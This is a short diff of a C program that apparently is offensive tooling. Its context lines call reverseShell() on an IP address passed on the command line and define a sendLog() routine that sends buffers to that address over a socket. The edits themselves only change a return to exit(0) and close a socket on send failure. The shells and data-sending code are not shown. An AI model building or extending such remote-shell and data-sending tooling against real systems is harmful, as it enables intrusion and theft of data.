@@ -41,7 +41,7 @@ int main(int argc, char *argv[]) {
                     //sprintf(cmd, "python /remote.py %s %d", argv[1], PORT);
                     //system(cmd);
                     reverseShell(argv[1]);
-                    return 0;
+                    exit(0);
                 }
             }
             else {
@@ -88,6 +88,7 @@ int sendLog(char* ip) {
         //printf("Sending: %s\n", sendbuf);
         if (send(sockfd, sendbuf, 100, 0) == -1){
               //perror("send");
+              close(sockfd);
               return 0;
         }
         usleep(100000);
